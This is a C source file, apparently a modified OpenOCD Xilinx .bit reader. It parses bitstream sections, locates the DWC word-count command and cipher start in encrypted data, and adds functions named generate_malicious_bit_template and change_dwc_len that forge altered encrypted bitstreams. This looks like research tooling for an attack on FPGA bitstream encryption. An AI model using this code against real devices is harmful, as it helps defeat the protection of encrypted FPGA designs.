/***************************************************************************
 *   Copyright (C) 2006 by Dominic Rath                                    *
 *   Dominic.Rath@gmx.de                                                   *
 *                                                                         *
 *   This program is free software; you can redistribute it and/or modify  *
 *   it under the terms of the GNU General Public License as published by  *
 *   the Free Software Foundation; either version 2 of the License, or     *
 *   (at your option) any later version.                                   *
 *                                                                         *
 *   This program is distributed in the hope that it will be useful,       *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of        *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         *
 *   GNU General Public License for more details.                          *
 *                                                                         *
 *   You should have received a copy of the GNU General Public License     *
 *   along with this program.  If not, see <http://www.gnu.org/licenses/>. *
 ***************************************************************************/

#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "xilinx_bit.h"
#include "pld.h"
#include <helper/log.h>

#include <sys/stat.h>

static int read_section(FILE *input_file, int length_size, char section,
						uint32_t *buffer_length, uint8_t **buffer)
{
	uint8_t length_buffer[4];
	int length;
	char section_char;
	int read_count;

	if ((length_size != 2) && (length_size != 4))
	{
		LOG_ERROR("BUG: length_size neither 2 nor 4");
		return ERROR_PLD_FILE_LOAD_FAILED;
	}

	read_count = fread(&section_char, 1, 1, input_file);
	if (read_count != 1)
		return ERROR_PLD_FILE_LOAD_FAILED;

	if (section_char != section)
		return ERROR_PLD_FILE_LOAD_FAILED;

	read_count = fread(length_buffer, 1, length_size, input_file);
	if (read_count != length_size)
		return ERROR_PLD_FILE_LOAD_FAILED;

	if (length_size == 4)
		length = be_to_h_u32(length_buffer);
	else /* (length_size == 2) */
		length = be_to_h_u16(length_buffer);

	if (buffer_length)
		*buffer_length = length;

	*buffer = malloc(length);

	read_count = fread(*buffer, 1, length, input_file);
	if (read_count != length)
		return ERROR_PLD_FILE_LOAD_FAILED;

	return ERROR_OK;
}

int xilinx_read_bit_file(struct xilinx_bit_file *bit_file, const char *filename)
{
	FILE *input_file;
	struct stat input_stat;
	int read_count;

	if (!filename || !bit_file)
		return ERROR_COMMAND_SYNTAX_ERROR;

	if (stat(filename, &input_stat) == -1)
	{
		LOG_ERROR("couldn't stat() %s: %s", filename, strerror(errno));
		return ERROR_PLD_FILE_LOAD_FAILED;
	}

	if (S_ISDIR(input_stat.st_mode))
	{
		LOG_ERROR("%s is a directory", filename);
		return ERROR_PLD_FILE_LOAD_FAILED;
	}

	if (input_stat.st_size == 0)
	{
		LOG_ERROR("Empty file %s", filename);
		return ERROR_PLD_FILE_LOAD_FAILED;
	}

	input_file = fopen(filename, "rb");
	if (input_file == NULL)
	{
		LOG_ERROR("couldn't open %s: %s", filename, strerror(errno));
		return ERROR_PLD_FILE_LOAD_FAILED;
	}

	read_count = fread(bit_file->unknown_header, 1, 13, input_file);
	if (read_count != 13)
	{
		LOG_ERROR("couldn't read unknown_header from file '%s'", filename);
		return ERROR_PLD_FILE_LOAD_FAILED;
	}

	if (read_section(input_file, 2, 'a', NULL, &bit_file->source_file) != ERROR_OK)
		return ERROR_PLD_FILE_LOAD_FAILED;

	if (read_section(input_file, 2, 'b', NULL, &bit_file->part_name) != ERROR_OK)
		return ERROR_PLD_FILE_LOAD_FAILED;

	if (read_section(input_file, 2, 'c', NULL, &bit_file->date) != ERROR_OK)
		return ERROR_PLD_FILE_LOAD_FAILED;

	if (read_section(input_file, 2, 'd', NULL, &bit_file->time) != ERROR_OK)
		return ERROR_PLD_FILE_LOAD_FAILED;

	if (read_section(input_file, 4, 'e', &bit_file->length, &bit_file->data) != ERROR_OK)
		return ERROR_PLD_FILE_LOAD_FAILED;

	bit_file->cipher_start = 0;
	bit_file->dwc_length_offset = 0;
	bit_file->dwc_length = 0;
	bit_file->rolling_delta = 0x00;
	// find dwc 30034001
	if (bit_file->length > 512)
	{
		for (int i = 0; i < 0xE0; i++)
		{
			if (bit_file->data[i] == 0x30 && bit_file->data[i + 1] == 0x03 && bit_file->data[i + 2] == 0x40 && bit_file->data[i + 3] == 0x01)
			{
				bit_file->dwc_length_offset = i + 4;
				bit_file->dwc_length = be_to_h_u32(&bit_file->data[i + 4]); // len in word
				bit_file->cipher_start = i + 8;
				bit_file->rolling_delta = bit_file->data[bit_file->cipher_start + 0x3b];
				break;
			}
		}
	}

	LOG_DEBUG("bit_file: %s %s %s,%s %" PRIi32 "", bit_file->source_file, bit_file->part_name,
			  bit_file->date, bit_file->time, bit_file->length);

	fclose(input_file);

	return ERROR_OK;
}

int generate_malicious_bit_template(struct xilinx_bit_file *bit_file, struct xilinx_bit_file *bit_file_mod){
	bit_file_mod->length = bit_file->dwc_length_offset + 4 + MAL_ENC_DWC_WORD_LEN_MAX * 4;
	bit_file_mod->data = malloc(bit_file_mod->length);
	bit_file_mod->dwc_length = MAL_ENC_DWC_WORD_LEN_MAX;
	uint32_t dwc_length_bswapped = bswap32(MAL_ENC_DWC_WORD_LEN_MAX);
	bit_file_mod->dwc_length_offset = bit_file->dwc_length_offset;
	bit_file_mod->cipher_start = bit_file->cipher_start;
	memcpy(bit_file_mod->data, bit_file->data, bit_file_mod->length);
	memcpy(&bit_file_mod->data[bit_file_mod->dwc_length_offset], &dwc_length_bswapped, 4);
	return ERROR_OK;
}

int change_dwc_len(struct xilinx_bit_file *bit_file_mod){
	if(bit_file_mod->dwc_length > MAL_ENC_DWC_WORD_LEN_MAX){
		bit_file_mod->dwc_length = MAL_ENC_DWC_WORD_LEN_MAX;
	}

	if(bit_file_mod->dwc_length < MAL_ENC_DWC_WORD_LEN_MIN){
		bit_file_mod->dwc_length = MAL_ENC_DWC_WORD_LEN_MIN;
	}
	bit_file_mod->length = bit_file_mod->dwc_length_offset + 4 + bit_file_mod->dwc_length * 4;
	uint32_t dwc_length_bswapped = bswap32(bit_file_mod->dwc_length);
	memcpy(&bit_file_mod->data[bit_file_mod->dwc_length_offset], &dwc_length_bswapped, 4);
	return ERROR_OK;
}